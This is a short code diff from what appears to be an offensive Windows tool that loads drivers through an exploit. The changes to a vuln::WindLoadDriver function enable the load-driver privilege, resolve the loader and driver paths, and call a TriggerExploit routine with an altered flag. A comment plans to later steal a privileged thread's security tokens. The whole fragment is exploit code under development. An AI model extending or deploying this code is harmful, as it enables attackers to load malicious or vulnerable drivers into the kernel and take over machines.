@@ -9,10 +9,14 @@ NTSTATUS vuln::WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hid
 	constexpr ULONG SE_LOAD_DRIVER_PRIVILEGE = { 10UL };
 	BOOLEAN SeLoadDriverWasEnabled{};
 
-	std::wprintf( L"[+] WindLoadDriver called\n" );
+	std::wprintf( L"[*] Load Driver called...\n" );
+
+	// Priv Check -> gonna need eventually need to be a stolen thread with perms -> security tokens
+	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
+	if ( !NT_SUCCESS( stat ) ) return stat;
 
 	// Expand full paths
-	NTSTATUS stat = RtlGetFullPathName_UEx( LoaderName, MAX_PATH * sizeof( WCHAR ), LoaderPath, nullptr, nullptr );
+	stat = RtlGetFullPathName_UEx( LoaderName, MAX_PATH * sizeof( WCHAR ), LoaderPath, nullptr, nullptr );
 	if ( !NT_SUCCESS( stat ) ) return stat;
 
 	stat = RtlGetFullPathName_UEx( DriverName, MAX_PATH * sizeof( WCHAR ), DriverPath, nullptr, nullptr );
@@ -29,7 +33,7 @@ NTSTATUS vuln::WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hid
 	// call prim
 	std::wprintf( L"[+] Triggering exploit with:\n    Loader: %ls\n    Target: %ls\n", LoaderServiceName, DriverServiceName );
 	wprintf( L"\n" );
-	vuln::TriggerExploit( LoaderServiceName, DriverServiceName, 1 );
+	vuln::TriggerExploit( LoaderServiceName, DriverServiceName, 0 );
 
 	return stat;
 }
